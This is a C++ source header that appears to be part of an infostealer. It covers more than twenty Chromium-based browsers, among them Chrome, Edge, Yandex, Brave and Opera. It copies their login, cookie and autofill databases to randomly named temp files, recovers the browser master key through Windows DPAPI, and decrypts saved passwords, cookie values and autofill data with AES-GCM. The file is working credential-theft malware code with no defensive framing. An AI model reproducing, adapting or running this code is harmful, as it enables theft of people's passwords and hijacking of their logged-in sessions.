
#pragma once

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <iomanip>
#include <botan/base64.h>
#include <botan/cipher_mode.h>
#include <botan/hex.h>
#include <sqlite3.h>
#include <nlohmann/json.hpp>
#include <windows.h>
#include <wincrypt.h>
#include <ShlObj.h>
#include <botan/gcm.h>
#include <botan/base64.h>
#include <botan/aes.h>
#include <kubazip/zip/zip.h>

#include "../Helper/Helper.hpp"

#include "structures.hpp"
#pragma comment (lib, "botan.lib")

namespace Core
{

    class Chromium {
    private:
        static std::string generateRandomDB(int length) {
            const std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            const int charsetLength = charset.length();
            std::srand(static_cast<unsigned int>(std::time(nullptr)));
            std::string randomString;
            for (int i = 0; i < length; ++i) {
                int randomIndex = std::rand() % charsetLength;
                randomString += charset[randomIndex];
            }
            return randomString + ".db";
        }

        static Botan::secure_vector<uint8_t> get_encryption_key(std::wstring subPath)
        {
            try
            {
                std::filesystem::path local_state_path;
                if (subPath != L"Opera Software\\Opera Stable" && subPath != L"Opera Software\\Opera GX Stable") {
                    local_state_path = Helper::getUserFolder() / std::filesystem::path(L"AppData\\Local\\" + subPath + L"\\User Data\\Local State");
                }
                else {
                    local_state_path = Helper::getUserFolder() / std::filesystem::path(L"AppData\\Roaming\\" + subPath + L"\\Local State");
                }

                std::ifstream local_state_file(local_state_path, std::ios::binary);
                if (!local_state_file) {
                    return Botan::secure_vector<uint8_t>();
                }
                nlohmann::json local_state_data;
                try {
                    local_state_file >> local_state_data;
                }
                catch (const nlohmann::json::parse_error&) {
                    return Botan::secure_vector<uint8_t>();
                }
                local_state_file.close();
                Botan::secure_vector<uint8_t> encryption_key = Botan::base64_decode(local_state_data["os_crypt"]["encrypted_key"]);
                encryption_key = Botan::secure_vector<uint8_t>(encryption_key.begin() + 5, encryption_key.end());

                DATA_BLOB dataIn, dataOut;
                dataIn.cbData = static_cast<DWORD>(encryption_key.size());
                dataIn.pbData = encryption_key.data();
                dataOut.cbData = 0;
                dataOut.pbData = nullptr;
                CryptUnprotectData(&dataIn, nullptr, nullptr, nullptr, nullptr, 0, &dataOut);

                Botan::secure_vector<uint8_t> result(dataOut.cbData);
                if (dataOut.cbData > 0) {
                    std::copy(dataOut.pbData, dataOut.pbData + dataOut.cbData, result.begin());
                }

                LocalFree(dataOut.pbData);
                return result;
            }
            catch (const std::exception&)
            {
                return {};
            }
        }

        static std::string data_decryption(Botan::secure_vector<uint8_t> encrypted_data, Botan::secure_vector<uint8_t> iv, Botan::secure_vector<uint8_t> key)
        {
            try
            {
                std::unique_ptr<Botan::Cipher_Mode> cipher(Botan::Cipher_Mode::create("AES-256/GCM", Botan::DECRYPTION));
                cipher->set_key(key);
                cipher->start(iv);
                cipher->finish(encrypted_data);
                return std::string(encrypted_data.begin(), encrypted_data.end());
            }
            catch (const std::exception&) {
                try {
                    DATA_BLOB dataIn, dataOut;
                    dataIn.cbData = static_cast<DWORD>(encrypted_data.size());
                    dataIn.pbData = encrypted_data.data();
                    dataOut.cbData = 0;
                    dataOut.pbData = nullptr;
                    CryptUnprotectData(&dataIn, nullptr, nullptr, nullptr, nullptr, 0, &dataOut);
                    std::string result(reinterpret_cast<const char*>(dataOut.pbData), dataOut.cbData);
                    LocalFree(dataOut.pbData);
                    return result;
                }
                catch (const std::exception&) { return "No Data"; }
            }

        }

        static std::string decryptData(std::vector<uint8_t> encrypted_pass, Botan::secure_vector<uint8_t> key)
        {
            try
            {
                std::string starts(reinterpret_cast<const char*>(encrypted_pass.data()), 3);
                if (starts == "v10" || starts == "v11") {
                    if (encrypted_pass.size() < 15)
                        return "No Data";
                    Botan::secure_vector<uint8_t> iv_vec(encrypted_pass.begin() + 3, encrypted_pass.begin() + 15);
                    Botan::secure_vector<uint8_t> encrypted_data_vec(encrypted_pass.begin() + 15, encrypted_pass.end());
                    return data_decryption(encrypted_data_vec, iv_vec, key);
                }
                else {
                    if (encrypted_pass.size() < 12)
                        return "No Data";
                    Botan::secure_vector<uint8_t> iv_vec(encrypted_pass.begin(), encrypted_pass.begin() + 12);
                    Botan::secure_vector<uint8_t> encrypted_data_vec(encrypted_pass.begin() + 12, encrypted_pass.end());
                    return data_decryption(encrypted_data_vec, iv_vec, key);
                }
            }
            catch (const std::exception&)
            {
                return "No Data";
            }
        }

        static std::string decryptDataYandex(std::vector<uint8_t> encrypted_pass, Botan::secure_vector<uint8_t> key)
        {
            if (encrypted_pass.size() < 12) {
                return "No Data";
            }
            try
            {
                Botan::secure_vector<uint8_t> iv_vec(encrypted_pass.begin(), encrypted_pass.begin() + 12);
                Botan::secure_vector<uint8_t> encrypted_data_vec(encrypted_pass.begin() + 12, encrypted_pass.end());
                return data_decryption(encrypted_data_vec, iv_vec, key);
            }
            catch (const std::exception&)
            {
                return "No Data";
            }

        }

    public:
        static std::map<std::wstring, std::wstring> BrowsersInitialization()
        {
            std::map<std::wstring, std::wstring> Browsers;
            //AppData/Local
            Browsers[L"chrome"] = L"Google\\Chrome";
            Browsers[L"edge"] = L"Microsoft\\Edge";
            Browsers[L"yandex"] = L"Yandex\\YandexBrowser";
            Browsers[L"chromium"] = L"Chromium";
            Browsers[L"brave"] = L"BraveSoftware\\Brave-Browser";
            Browsers[L"centbrowser"] = L"CentBrowser";
            Browsers[L"chedot"] = L"Chedot";
            Browsers[L"chrome_canary"] = L"Google\\Chrome SxS";
            Browsers[L"coccoc"] = L"CocCoc\\Browser";
            Browsers[L"dragon"] = L"Comodo\\Dragon";
            Browsers[L"epic-privacy-browser"] = L"Epic Privacy Browser";
            Browsers[L"kometa"] = L"Kometa";
            Browsers[L"orbitum"] = L"Orbitum";
            Browsers[L"sputnik"] = L"Sputnik\\Sputnik";
            Browsers[L"torch"] = L"Torch";
            Browsers[L"vivaldi"] = L"Vivaldi";
            Browsers[L"atom-mailru"] = L"Mail.Ru\\Atom";
            Browsers[L"ChromePlus"] = L"Google\\ChromePlus";
            Browsers[L"catalinagroup"] = L"CatalinaGroup\\Citrio";
            Browsers[L"360browser"] = L"360Browser\\Browser";
            Browsers[L"maxthon"] = L"Maxthon\\Application";
            //AppData/Roaming
            Browsers[L"opera"] = L"Opera Software\\Opera Stable";
            Browsers[L"opera-gx"] = L"Opera Software\\Opera GX Stable";

            return Browsers;
        }

        static DecryptedAccount getPasswords(std::wstring subPath)
        {
            try {
                std::wstring db_path;
                if (subPath != L"Opera Software\\Opera Stable" && subPath != L"Opera Software\\Opera GX Stable") {
                    db_path = Helper::getUserFolder() / std::filesystem::path(L"AppData\\Local");
                    if (subPath != L"Yandex\\YandexBrowser") {
                        db_path = db_path / std::filesystem::path(subPath + L"\\User Data\\Default\\Login Data");
                    }
                    else {
                        db_path = db_path / std::filesystem::path(subPath + L"\\User Data\\Default\\Ya Passman Data");
                    }
                }
                else {
                    db_path = Helper::getUserFolder() / std::filesystem::path(L"AppData\\Roaming\\" + subPath + L"\\Login Data");
                }
                if (!std::filesystem::exists(db_path)) {
                    return DecryptedAccount{ false };
                }

                std::filesystem::path temp_file = Helper::getUserFolder() / std::filesystem::path("AppData\\Local\\Temp\\" + generateRandomDB(8));
                std::ifstream src(db_path, std::ios::binary);
                std::ofstream dst(temp_file, std::ios::binary);
                dst << src.rdbuf();
                src.close();
                dst.close();

                sqlite3* db;
                int result = sqlite3_open(temp_file.string().c_str(), &db);
                if (result != SQLITE_OK) {
                    std::filesystem::remove(temp_file);
                    return DecryptedAccount{ false };
                }

                sqlite3_stmt* stmt;
                result = sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins;", -1, &stmt, nullptr);
                if (result != SQLITE_OK) {
                    sqlite3_close(db);
                    std::filesystem::remove(temp_file);
                    return DecryptedAccount{ false };
                }
                result = sqlite3_step(stmt);
                if (result == SQLITE_DONE) {
                    // The table is empty
                    sqlite3_finalize(stmt);
                    sqlite3_close(db);
                    std::filesystem::remove(temp_file);
                    return DecryptedAccount{ false };
                }

                Botan::secure_vector<uint8_t> encryption_key = get_encryption_key(subPath);

                DecryptedAccount decryptedAccount{ true };
                while (result == SQLITE_ROW) {
                    std::string main_url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));

                    int blobSize = sqlite3_column_bytes(stmt, 2);
                    std::vector<uint8_t> password(blobSize);
                    memcpy(password.data(), sqlite3_column_blob(stmt, 2), blobSize);

                    if (!username.empty() && !password.empty()) {
                        //std::string temp(password.begin(), password.end());
                        decryptedAccount.website.push_back(main_url);
                        decryptedAccount.username.push_back(username);
                        if (subPath != L"Yandex\\YandexBrowser") {
                            decryptedAccount.password.push_back(decryptData(password, encryption_key));
                        }
                        else {
                            decryptedAccount.password.push_back(decryptData(password, encryption_key));
                        }
                    }
                    result = sqlite3_step(stmt);
                }
                sqlite3_finalize(stmt);
                sqlite3_close(db);
                std::filesystem::remove(temp_file);

                return decryptedAccount;
            }
            catch (const std::exception&)
            {
                return DecryptedAccount{ false };
            }

        }
        static DecryptedCookie getCookies(std::wstring subPath)
        {
            try
            {
                std::wstring db_path;
                if (subPath != L"Opera Software\\Opera Stable" && subPath != L"Opera Software\\Opera GX Stable") {
                    db_path = Helper::getUserFolder() / std::filesystem::path(L"AppData\\Local\\" + subPath + L"\\User Data\\Default\\Network\\Cookies");
                }
                else {
                    db_path = Helper::getUserFolder() / std::filesystem::path(L"AppData\\Roaming\\" + subPath + L"\\Network\\Cookies");
                }
                if (!std::filesystem::exists(db_path)) {
                    return DecryptedCookie{ false };
                }

                std::filesystem::path temp_file = Helper::getUserFolder() / std::filesystem::path("AppData\\Local\\Temp\\" + generateRandomDB(8));
                std::ifstream src(db_path, std::ios::binary);
                std::ofstream dst(temp_file, std::ios::binary);
                dst << src.rdbuf();
                src.close();
                dst.close();

                sqlite3* db;
                int result = sqlite3_open(temp_file.string().c_str(), &db);
                if (result != SQLITE_OK) {
                    std::filesystem::remove(temp_file);
                    return DecryptedCookie{ false };
                }

                sqlite3_exec(db, "PRAGMA encoding = 'UTF-8';", 0, 0, 0);
                sqlite3_stmt* stmt;
                result = sqlite3_prepare_v2(db, "SELECT host_key, is_httponly, path, is_secure, expires_utc, name, encrypted_value, value FROM cookies;", -1, &stmt, nullptr);
                if (result != SQLITE_OK) {
                    sqlite3_close(db);
                    std::filesystem::remove(temp_file);
                    return DecryptedCookie{ false };
                }
                result = sqlite3_step(stmt);
                if (result == SQLITE_DONE) {
                    // The table is empty
                    sqlite3_finalize(stmt);
                    sqlite3_close(db);
                    std::filesystem::remove(temp_file);
                    return DecryptedCookie{ false };
                }

                Botan::secure_vector<uint8_t> encryption_key = get_encryption_key(subPath);

                DecryptedCookie decryptedCookie{ true };
                while (result == SQLITE_ROW) {
                    std::string is_httponly, is_secure;
                    std::string host_key = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    if (sqlite3_column_int64(stmt, 1) == 1)
                        is_httponly = "TRUE";
                    else if (sqlite3_column_int64(stmt, 1) == 0)
                        is_httponly = "FALSE";
                    else
                        is_httponly = "UNKNOWN";
                    std::string path = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
                    if (sqlite3_column_int64(stmt, 3) == 1)
                        is_secure = "TRUE";
                    else if (sqlite3_column_int64(stmt, 3) == 0)
                        is_secure = "FALSE";
                    else
                        is_secure = "UNKNOWN";
                    int64_t expires_utc = sqlite3_column_int64(stmt, 4);
                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 5));
                    int blobSize = sqlite3_column_bytes(stmt, 6);
                    std::vector<uint8_t> encrypted_value(blobSize);
                    memcpy(encrypted_value.data(), sqlite3_column_blob(stmt, 6), blobSize);
                    std::string value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 7));

                    std::string decrypted_value;
                    if (value.empty()) {
                        decrypted_value = decryptData(encrypted_value, encryption_key);
                    }
                    else {
                        decrypted_value = value;
                    }
                    decryptedCookie.hostkey.push_back(host_key);
                    decryptedCookie.httponly.push_back(is_httponly);
                    decryptedCookie.path.push_back(path);
                    decryptedCookie.secure.push_back(is_secure);
                    decryptedCookie.expires_utc.push_back(expires_utc);
                    decryptedCookie.name.push_back(name);
                    decryptedCookie.decrypted_value.push_back(decrypted_value);

                    result = sqlite3_step(stmt);
                }
                sqlite3_finalize(stmt);
                sqlite3_close(db);
                std::filesystem::remove(temp_file);

                return decryptedCookie;
            }
            catch (const std::exception&)
            {
                return DecryptedCookie{ false };
            }
        }

        static AutoFill getAutoFill(std::wstring subPath)
        {
            try {
                std::wstring db_path;
                if (subPath != L"Opera Software\\Opera Stable" && subPath != L"Opera Software\\Opera GX Stable") {
                    db_path = Helper::getUserFolder() / std::filesystem::path(L"AppData\\Local") / std::filesystem::path(subPath + L"\\User Data\\Default\\Web Data");
                }
                else {
                    db_path = Helper::getUserFolder() / std::filesystem::path(L"AppData\\Roaming\\" + subPath + L"\\Web Data");
                }
                if (!std::filesystem::exists(db_path)) {
                    return AutoFill{ false };
                }

                std::filesystem::path temp_file = Helper::getUserFolder() / std::filesystem::path("AppData\\Local\\Temp\\" + generateRandomDB(8));
                std::ifstream src(db_path, std::ios::binary);
                std::ofstream dst(temp_file, std::ios::binary);
                dst << src.rdbuf();
                src.close();
                dst.close();

                sqlite3* db;
                int result = sqlite3_open(temp_file.string().c_str(), &db);
                if (result != SQLITE_OK) {
                    std::filesystem::remove(temp_file);
                    return AutoFill{ false };
                }

                sqlite3_stmt* stmt;
                result = sqlite3_prepare_v2(db, "SELECT name, value FROM autofill;", -1, &stmt, nullptr);
                if (result != SQLITE_OK) {
                    sqlite3_close(db);
                    std::filesystem::remove(temp_file);
                    return AutoFill{ false };
                }
                result = sqlite3_step(stmt);
                if (result == SQLITE_DONE) {
                    // The table is empty
                    sqlite3_finalize(stmt);
                    sqlite3_close(db);
                    std::filesystem::remove(temp_file);
                    return AutoFill{ false };
                }

                Botan::secure_vector<uint8_t> encryption_key = get_encryption_key(subPath);

                AutoFill decryptedAutoFill{ true };
                while (result == SQLITE_ROW) {
                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    if (!name.empty() && subPath == L"Microsoft\\Edge")
                    {
                        int blobSize = sqlite3_column_bytes(stmt, 1);
                        std::vector<uint8_t> value(blobSize);
                        memcpy(value.data(), sqlite3_column_blob(stmt, 1), blobSize);
                        decryptedAutoFill.name.push_back(name);
                        decryptedAutoFill.value.push_back(decryptData(value, encryption_key));
                    }
                    else if (!name.empty())
                    {
                        std::string value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                        decryptedAutoFill.name.push_back(name);
                        decryptedAutoFill.value.push_back(value);
                    }
                    result = sqlite3_step(stmt);
                }
                sqlite3_finalize(stmt);
                sqlite3_close(db);
                std::filesystem::remove(temp_file);

                return decryptedAutoFill;
            }
            catch (const std::exception&)
            {
                return AutoFill{ false };
            }
        }
    };
}
